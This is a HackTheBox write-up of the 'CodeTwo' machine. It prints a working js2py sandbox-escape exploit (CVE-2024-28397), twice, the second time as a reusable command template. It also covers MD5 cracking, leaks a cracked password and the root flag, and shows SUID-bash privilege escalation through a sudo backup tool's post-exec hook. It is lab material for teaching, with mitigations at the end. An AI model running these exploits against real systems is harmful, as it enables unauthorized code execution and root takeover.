# HackTheBox - CodeTwo Writeup

## Machine Information

| Property | Value |
|----------|-------|
| **Machine Name** | CodeTwo |
| **Difficulty** | Medium |
| **Attack Vectors** | CVE-2024-28397 (js2py RCE), Password Cracking, Privilege Escalation |
| **Key Vulnerabilities** | js2py 0.74, MD5 Password Hashing, npbackup-cli SUID |

---

## Executive Summary

This writeup demonstrates the complete exploitation chain for the CodeTwo HackTheBox machine, from initial reconnaissance to root access. The attack leverages a critical vulnerability in js2py version 0.74 (CVE-2024-28397) to achieve remote code execution, followed by password cracking and privilege escalation through misconfigured backup software.

---

## Attack Chain Overview

1. Reconnaissance and service enumeration
2. Web application analysis and source code review
3. CVE-2024-28397 exploitation for file exfiltration
4. Password hash extraction and cracking
5. SSH access as user marco
6. Privilege escalation via npbackup-cli configuration manipulation
7. Root access and flag capture

---

## Detailed Methodology

### Phase 1: Reconnaissance

#### Port Scanning

Initial port scan reveals two open services:

```bash
nmap -sC -sV 10.129.1.131
```

**Results:**
- Port 22/tcp - OpenSSH 8.2p1
- Port 8000/tcp - Gunicorn 20.0.4 (Python web server)

#### Web Application Analysis

Navigate to `http://10.129.1.131:8000` to discover a JavaScript code execution platform. Key observations:

- Application allows users to write and execute JavaScript code
- Download button provides access to application source code (app.zip)
- User registration functionality available

---

### Phase 2: Source Code Analysis

#### Application Components

Downloaded files include:
- `app.py` - Main Flask application
- `requirements.txt` - Python dependencies
- `script.js` - Frontend JavaScript
- `users.db` - Empty SQLite database template

#### Critical Findings

**Key Discovery 1: Vulnerable Dependency**

```
js2py==0.74
```

This version is vulnerable to CVE-2024-28397, allowing Python code execution despite `js2py.disable_pyimport()` being called.

**Key Discovery 2: Weak Password Hashing**

Passwords are hashed using MD5 (from app.py):

```python
password_hash = hashlib.md5(password.encode()).hexdigest()
```

**Key Discovery 3: Flask Secret Key Exposed**

```python
app.secret_key = 'S3cr3tK3yC0d3PartTw0'
```

**Key Discovery 4: Code Execution Endpoint**

The `/run_code` endpoint evaluates user-supplied JavaScript:

```python
result = js2py.eval_js(code)
```

---

### Phase 3: Initial Access via CVE-2024-28397

#### Vulnerability Research

CVE-2024-28397 allows attackers to escape the JavaScript sandbox and execute Python code by accessing Python objects through JavaScript's prototype chain. The exploit works by:

1. Using `Object.getOwnPropertyNames({})` to access Python's `__getattribute__` method
2. Traversing the object hierarchy to reach Python's base object class
3. Finding `subprocess.Popen` class to execute system commands

#### User Enumeration

Attempted to register as 'marco' and received an Internal Server Error, indicating the username already exists in the database (violates unique constraint).

#### Exploit Development

The PoC from GitHub was adapted for file exfiltration instead of direct command execution:

```javascript
let cmd = "cp /home/app/app/instance/users.db /home/app/app/static/users.db"
let hacked, bymarve, n11
let getattr, obj
hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```

#### Database Exfiltration

Execute the payload through the web application's code editor:

1. Paste exploit code into the editor
2. Click 'Run Code' to execute
3. Download database from `http://10.129.1.131:8000/static/users.db`

---

### Phase 4: Credential Recovery

#### Database Analysis

Open the exfiltrated database:

```bash
sqlite3 users.db
.tables
SELECT * FROM user;
```

Results show user 'marco' with an MD5 password hash.

#### Hash Cracking

Use hashcat or john to crack the MD5 hash:

```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Or use online MD5 databases. **Password recovered:** `sweetangelbabylove`

---

### Phase 5: User Access

Connect via SSH with recovered credentials:

```bash
ssh marco@10.129.1.131
```

Successfully authenticated as user marco.

---

### Phase 6: Privilege Escalation

#### Sudo Enumeration

```bash
sudo -l
```

Output reveals marco can run npbackup-cli as root without password:

```
(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

#### Configuration File Analysis

Locate and examine the npbackup configuration:

```bash
cat /home/marco/npbackup.conf
```

The configuration file contains a `post_exec_commands` array that executes commands after backup operations.

#### Exploitation Strategy

Since the config file is owned by root:root but writable by the backups group, we create a modified copy:

```bash
cp /home/marco/npbackup.conf /tmp/npbackup.conf
nano /tmp/npbackup.conf
```

Modify the `post_exec_commands` section under `default_group`:

```yaml
post_exec_commands: [/bin/cp /bin/bash /tmp/rootbash, /bin/chmod +s /tmp/rootbash]
```

#### Trigger Privilege Escalation

Execute npbackup-cli with the modified configuration:

```bash
sudo /usr/local/bin/npbackup-cli -c /tmp/npbackup.conf --backup
```

The backup runs successfully, executing our malicious `post_exec_commands` as root, creating a SUID bash binary.

#### Root Access

Execute the SUID bash binary to gain root privileges:

```bash
/tmp/rootbash -p
```

The `-p` flag preserves the SUID permissions, granting a root shell.

---

### Phase 7: Flag Capture

Navigate to root directory and retrieve flag:

```bash
cd /root
cat root.txt
```

**Root flag:** `63dd5727640d7d9eaf743b157f21afc3`

---

## Quick Reference Cheat Sheet

### CVE-2024-28397 Exploitation

**Vulnerability:** js2py <= 0.74 allows Python code execution despite `disable_pyimport()`

**Basic Exploit Template:**

```javascript
let cmd = "YOUR_COMMAND_HERE"
let hacked, bymarve, n11, getattr, obj
hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```

**Useful Commands:**
- File exfiltration: `cp /path/to/file /path/to/accessible/location`
- Directory listing: `ls -la /path`
- File search: `find / -name filename 2>/dev/null`

---

### Password Cracking

**MD5 Hash Cracking:**

```bash
# Using hashcat
hashcat -m 0 -a 0 hash.txt wordlist.txt

# Using john
john --format=raw-md5 --wordlist=wordlist.txt hash.txt

# Online databases
https://crackstation.net
https://hashes.com
```

---

### SQLite Database Commands

```bash
# Open database
sqlite3 database.db

# List tables
.tables

# View table schema
.schema table_name

# Query data
SELECT * FROM table_name;

# Exit
.quit
```

---

### Privilege Escalation Techniques

**Sudo Enumeration:**

```bash
sudo -l
```

**SUID Binary Creation:**

```bash
# Copy bash to temp location
cp /bin/bash /tmp/rootbash

# Set SUID bit
chmod +s /tmp/rootbash

# Execute with preserved privileges
/tmp/rootbash -p
```

**Configuration File Manipulation:**

When you can run a program with sudo that reads a config file:

1. Copy the original config to a writable location
2. Modify to include malicious commands in post_exec or similar sections
3. Run the program with sudo pointing to modified config

---

## Key Takeaways and Lessons Learned

### Security Weaknesses Identified

- Using outdated and vulnerable dependencies (js2py 0.74)
- Weak password hashing with MD5 instead of bcrypt or Argon2
- Exposed secret keys in source code
- Overly permissive sudo configuration for backup utility
- Configuration files allowing arbitrary command execution

### Recommended Mitigations

1. **Dependency Management:** Regularly update dependencies and scan for known vulnerabilities
2. **Password Security:** Use modern hashing algorithms like bcrypt, scrypt, or Argon2
3. **Secrets Management:** Never hardcode secrets; use environment variables or secret managers
4. **Code Execution Sandboxing:** Implement proper sandboxing for user-supplied code
5. **Least Privilege:** Restrict sudo permissions to specific commands with fixed arguments
6. **Configuration Security:** Validate and restrict configuration file options

---

## Tools and Resources

### Enumeration and Scanning
- nmap - Network port scanning
- curl/wget - HTTP interaction

### Exploitation
- CVE-2024-28397 PoC - GitHub repository
- Web browser - For interacting with application

### Password Cracking
- hashcat - GPU-accelerated password cracking
- john - CPU-based password cracking
- Online hash databases - CrackStation, Hashes.com

### Database Analysis
- sqlite3 - SQLite database interaction

### Post-Exploitation
- ssh - Secure shell access
- nano/vim - Text editor for configuration modification

---

## Conclusion

The CodeTwo machine demonstrates a realistic attack chain combining multiple vulnerabilities. The exploitation path required:

- Thorough source code review to identify vulnerable dependencies
- CVE research and exploit adaptation
- Creative problem-solving for file exfiltration
- Password cracking techniques
- Linux privilege escalation through configuration manipulation

This writeup serves as both a documentation of the exploitation process and a reference guide for similar scenarios involving JavaScript sandbox escapes, weak password storage, and sudo misconfigurations.

---

## References

- CVE-2024-28397: https://nvd.nist.gov/vuln/detail/CVE-2024-28397
- js2py GitHub: https://github.com/PiotrDabkowski/Js2Py
- OWASP Password Storage Cheat Sheet
- GTFOBins - Unix binaries for privilege escalation
- HackTricks - Privilege Escalation Techniques

---

#HTB #WriteUp #Penetration-Testing #CVE-2024-28397 #Privilege-Escalation #Linux